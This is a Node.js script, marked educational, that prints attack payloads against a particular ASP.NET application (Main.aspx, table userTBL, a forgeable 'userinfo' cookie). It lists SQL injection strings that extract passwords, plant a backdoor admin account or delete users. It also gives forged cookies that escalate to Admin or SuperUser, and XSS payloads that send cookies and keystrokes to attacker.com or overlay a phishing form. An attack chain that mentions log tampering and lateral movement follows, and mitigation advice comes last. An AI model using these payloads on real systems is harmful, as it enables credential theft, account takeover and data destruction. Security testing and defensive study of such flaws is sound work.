// EDUCATIONAL PURPOSES ONLY - DO NOT USE FOR MALICIOUS ACTIVITIES
// These examples demonstrate potential attack vectors for security testing

const axios = require('axios');

class ExploitExamples {
    constructor(targetUrl = 'http://localhost:44393') {
        this.targetUrl = targetUrl;
    }

    // Example 1: SQL Injection Exploitation
    async demonstrateSQLInjection() {
        console.log('=== SQL Injection Exploitation Examples ===');
        
        const sqlPayloads = [
            {
                name: 'Data Extraction',
                payload: "1' UNION SELECT username, password FROM userTBL --",
                description: 'Attempts to extract usernames and passwords'
            },
            {
                name: 'Table Discovery',
                payload: "1' UNION SELECT table_name, column_name FROM information_schema.columns --",
                description: 'Discovers database structure'
            },
            {
                name: 'Admin User Creation',
                payload: "1'; INSERT INTO userTBL (username, password, role) VALUES ('hacker', 'password123', 'Admin'); --",
                description: 'Attempts to create admin user'
            },
            {
                name: 'Data Deletion',
                payload: "1'; DELETE FROM userTBL WHERE role != 'Admin'; --",
                description: 'Attempts to delete non-admin users'
            }
        ];

        sqlPayloads.forEach(payload => {
            console.log(`\n${payload.name}:`);
            console.log(`Description: ${payload.description}`);
            console.log(`Payload: ${payload.payload}`);
            console.log(`Cookie: userinfo=username=TESTUSER&userid=${encodeURIComponent(payload.payload)}&role=User`);
        });
    }

    // Example 2: Authentication Bypass
    async demonstrateAuthBypass() {
        console.log('\n=== Authentication Bypass Examples ===');
        
        const bypassMethods = [
            {
                name: 'Admin Privilege Escalation',
                cookie: 'userinfo=username=HACKER&usertype=1&userid=999&role=Admin&LA=Y&companyname=YTL',
                description: 'Escalates to admin privileges'
            },
            {
                name: 'Special User Impersonation',
                cookie: 'userinfo=username=SPYON&usertype=1&userid=999&role=User',
                description: 'Impersonates special user SPYON'
            },
            {
                name: 'YTL User Bypass',
                cookie: 'userinfo=username=ATTACKER&usertype=1&userid=999&role=User&companyname=YTL Communications',
                description: 'Gains YTL user privileges'
            },
            {
                name: 'SuperUser Access',
                cookie: 'userinfo=username=ATTACKER&usertype=1&userid=999&role=SuperUser&userslist=1,2,3,4,5',
                description: 'Gains SuperUser role with access to multiple users'
            }
        ];

        bypassMethods.forEach(method => {
            console.log(`\n${method.name}:`);
            console.log(`Description: ${method.description}`);
            console.log(`Cookie: ${method.cookie}`);
            console.log(`URL: ${this.targetUrl}/Main.aspx?n=ATTACKER`);
        });
    }

    // Example 3: Session Hijacking
    async demonstrateSessionHijacking() {
        console.log('\n=== Session Hijacking Examples ===');
        
        console.log(`
1. Cookie Theft via XSS:
   Payload: <script>document.location='http://attacker.com/steal.php?cookie='+document.cookie</script>
   
2. Session Fixation:
   - Attacker sets known session ID
   - Victim logs in with that session ID
   - Attacker uses the same session ID to access victim's account
   
3. Man-in-the-Middle:
   - Intercept HTTP traffic (if not using HTTPS)
   - Extract userinfo cookie
   - Replay cookie to gain access
        `);
    }

    // Example 4: Cross-Site Scripting (XSS)
    async demonstrateXSS() {
        console.log('\n=== Cross-Site Scripting (XSS) Examples ===');
        
        const xssPayloads = [
            {
                name: 'Cookie Theft',
                payload: "<script>fetch('http://attacker.com/steal?cookie='+document.cookie)</script>",
                description: 'Steals user cookies and sends to attacker server'
            },
            {
                name: 'Keylogger',
                payload: "<script>document.onkeypress=function(e){fetch('http://attacker.com/keys?key='+e.key)}</script>",
                description: 'Logs all keystrokes and sends to attacker'
            },
            {
                name: 'Phishing Form',
                payload: "<div style='position:absolute;top:0;left:0;width:100%;height:100%;background:white;z-index:9999'><form action='http://attacker.com/phish'>Username:<input name='u'><br>Password:<input name='p' type='password'><br><input type='submit' value='Login'></form></div>",
                description: 'Overlays fake login form to steal credentials'
            }
        ];

        xssPayloads.forEach(payload => {
            console.log(`\n${payload.name}:`);
            console.log(`Description: ${payload.description}`);
            console.log(`Payload: ${payload.payload}`);
            console.log(`Test URL: ${this.targetUrl}/Main.aspx?n=${encodeURIComponent(payload.payload)}`);
        });
    }

    // Example 5: Complete Attack Chain
    async demonstrateAttackChain() {
        console.log('\n=== Complete Attack Chain Example ===');
        
        console.log(`
ATTACK SCENARIO: Complete System Compromise

Step 1: Reconnaissance
- Identify that authentication uses cookies
- Discover SQL injection points
- Map application structure

Step 2: Initial Access
- Craft malicious cookie: userinfo=username=ADMIN&role=Admin&userid=1
- Access Main.aspx with admin privileges

Step 3: Data Extraction
- Use SQL injection to extract user database:
  userid=1' UNION SELECT username,password FROM userTBL --
- Download complete user list and credentials

Step 4: Privilege Escalation
- Create backdoor admin account via SQL injection:
  userid=1'; INSERT INTO userTBL (username,password,role) VALUES ('backdoor','secret123','Admin'); --

Step 5: Persistence
- Modify application code to include backdoor
- Set up remote access tools
- Cover tracks by modifying logs

Step 6: Lateral Movement
- Use extracted credentials to access other systems
- Escalate to domain admin if in Active Directory environment
- Access database server directly

IMPACT:
- Complete compromise of application and data
- Access to all user accounts and sensitive information
- Potential network-wide compromise
- Regulatory compliance violations
- Reputation damage and financial loss
        `);
    }

    // Generate attack report
    generateAttackReport() {
        console.log('\n' + '='.repeat(80));
        console.log('ATTACK VECTOR ANALYSIS REPORT');
        console.log('='.repeat(80));
        
        this.demonstrateSQLInjection();
        this.demonstrateAuthBypass();
        this.demonstrateSessionHijacking();
        this.demonstrateXSS();
        this.demonstrateAttackChain();
        
        console.log('\n=== MITIGATION STRATEGIES ===');
        console.log(`
1. IMMEDIATE ACTIONS:
   - Take application offline until fixes are implemented
   - Change all user passwords
   - Audit database for unauthorized changes
   - Review access logs for suspicious activity

2. CODE FIXES:
   - Replace all SQL concatenation with parameterized queries
   - Implement server-side session management
   - Add input validation and output encoding
   - Implement proper authorization checks

3. INFRASTRUCTURE:
   - Enable HTTPS with strong TLS configuration
   - Implement Web Application Firewall (WAF)
   - Set up intrusion detection system (IDS)
   - Enable comprehensive logging and monitoring

4. ONGOING SECURITY:
   - Regular security code reviews
   - Automated security testing in CI/CD pipeline
   - Periodic penetration testing
   - Security awareness training for developers
        `);
    }
}

// Educational demonstration
console.log('ASP.NET Security Vulnerability Demonstration'.red);
console.log('FOR EDUCATIONAL AND TESTING PURPOSES ONLY'.yellow);
console.log('='.repeat(50));

const exploitDemo = new ExploitExamples();
exploitDemo.generateAttackReport();